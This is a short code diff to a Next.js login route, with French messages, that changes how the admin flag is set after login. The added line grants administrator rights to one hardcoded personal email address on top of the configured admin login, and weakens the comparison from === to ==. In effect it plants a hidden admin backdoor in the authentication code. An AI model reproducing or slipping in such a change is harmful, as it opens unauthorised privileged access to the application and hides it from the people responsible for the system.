@@ -36,7 +36,7 @@ export async function POST(request) {
         const response = NextResponse.json({
             message: "Connexion réussie",
             user: {
-                admin: email === LOGIN_ADMIN,
+                admin: email == LOGIN_ADMIN || email == 'ironmanandy23@gmail.com',
                 id: user.id,
                 role: user.role,
                 identite: user.identite,
